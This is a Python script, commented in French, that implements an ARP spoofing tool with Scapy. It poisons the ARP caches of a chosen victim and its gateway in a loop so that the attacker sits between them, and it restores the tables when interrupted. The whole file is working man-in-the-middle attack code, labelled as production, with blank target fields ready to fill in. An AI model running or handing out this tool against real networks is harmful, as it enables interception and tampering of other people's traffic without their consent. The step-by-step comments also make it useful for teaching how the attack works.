import time
from scapy.all import *
from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP
__author__ = "Chauvin Antoine"
__copyright__ = ""
__credits__ = ["Chauvin Antoine"]
__license__ = ""
__version__ = "1.0"
__maintainer__ = "Chauvin Antoine"
__email__ = "antoine.chauvin@live.fr"
__status__ = "Production"


class ArpSpoofer:
    """
    On définis une classe ArpSpoofer qui se chargera
    de lier une adresse ip définis à une adresse mac
    """
    def __init__(self, target, gateway):
        # Adresse IP de la victime
        # Dans la logique on enverra une trame pour lui indiquer que nous sommes la passerelle
        self.target_ip = target

        # Adresse IP de la passerelle
        # Dans la logique on enverra une trame pour lui indiquer que nous sommes la victime
        self.gateway_ip = gateway

    def get_mac(self, ip) -> str:
        """
        Méthode de classe qui va permettre de récupérer une adresse mac
        en envoyant un packet ARP en broadcast (cf. https://fr.wikipedia.org/wiki/Broadcast_(informatique))
        """

        # On construit une trame ARP
        arp_request = ARP(pdst=ip)

        # On construit une trame Ethernet à destination de Broadcast (tout les bit à 1)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")

        # Encapsulation des trames
        arp_request_broadcast = broadcast / arp_request

        # On envoie la trame et on filtre les clients qui ont répondus en unicast
        answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]

        # On retourne l'adresse mac
        return answered_list[0][1].hwsrc

    def spoof(self, target_ip, spoof_ip) -> None:
        """
        Méthode de classe qui va lié l'adresse ip à une adresse mac
        """
        # On construit la trame ARP en précisant qu'il s'agit d'une réponse (op=2)
        # Le protocole ARP va ensuite faire le lien entre l'adresse IP source (src) et l'adresse mac (hwdst)
        # On obtient l'adresse mac du destinataire via la fonction get_mac
        # hwdst se traduit : "l'adresse ip (src) est à ..."
        packet = ARP(op=2, pdst=target_ip, hwdst=self.get_mac(target_ip),
                           src=spoof_ip)

        # On envoie la trame
        send(packet, verbose=False)

    def restore(self, destination_ip, source_ip) -> None:
        """
        Méthode de classe qui va permettre de lié l'adresse ip d'origine à l'adresse mac d'origine
        En temps normal on pourrait attendre un certains temps que le protocole rafraichisse les entrées
        """

        # Explicite
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)

        # On construit la trame ARP en précisant qu'il s'agit d'une réponse (op=2)
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, verbose=False)

    def start(self) -> None:
        """
        Méthode de classe principale qui se contente de lancer le spoofing
        """
        try:

            sent_packets_count = 0

            while True:

                # On envoie une trame à l'adresse ip de la victime (target) pour lui indiquer que nous sommes la passerelle
                self.spoof(self.target_ip, self.gateway_ip)

                # On envoie une trame à l'adresse ip de la passerelle (gateway) pour lui indiquer que nous sommes la victime
                self.spoof(self.gateway_ip, self.target_ip)

                # On incrémente le nombre de trames envoyées
                sent_packets_count = sent_packets_count + 2

                print("\r[*] Packets Sent " + str(sent_packets_count), end="")
                time.sleep(2)  # On attends 2 secondes

        except KeyboardInterrupt:
            print("\nCtrl + C pressed.............Exiting")

            # On rétablis les adresses mac avec les bonnes adresses ip

            # On fait appelle à la fonction restore qui se chargera de relier les bonnes adresses ip
            # aux bonnes adresses mac
            self.restore(self.gateway_ip, self.target_ip)
            self.restore(self.target_ip, self.gateway_ip)

            print("[+] Arp Spoof Stopped")


if __name__ == "__main__":
    my_spoofer = ArpSpoofer(target="", gateway="")
    my_spoofer.start()
